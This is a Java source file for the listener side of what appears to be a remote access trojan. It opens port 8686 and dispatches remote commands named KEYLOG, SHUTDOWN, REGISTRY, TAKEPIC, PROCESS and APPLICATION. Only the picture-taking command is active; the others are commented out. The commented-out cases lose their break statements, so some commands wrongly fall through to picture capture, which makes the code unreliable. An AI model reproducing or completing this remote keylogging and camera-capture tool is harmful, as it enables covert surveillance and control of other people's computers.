package Server;

import javax.swing.*;
import java.io.*;
import java.net.*;

public class CreateServer {
    public CreateServer() throws IOException {
        System.out.println("Server Start Success!");
        InetAddress IP=InetAddress.getLocalHost();
        JOptionPane.showMessageDialog(null, "IP of your system is := "+IP.getHostAddress(),"Message", JOptionPane.WARNING_MESSAGE);

        ServerSocket server=new ServerSocket(8686);
        Socket socket=server.accept();

        DataInputStream dIn = new DataInputStream(socket.getInputStream());

        online: {
            while (true)
            {
                String command = dIn.readUTF();
                switch (command)
                {
                    case "KEYLOG": //keylog(); break;
                    case "SHUTDOWN": //shutdown(); break;
                    case "REGISTRY": //registry(); break;
                    case "TAKEPIC": new takepic(); break;
                    case "PROCESS": //process(); break;
                    case "APPLICATION": //application(); break;
                    case "QUIT": break online;

                }
            }
        }
        dIn.close();
        server.close();
    }
}
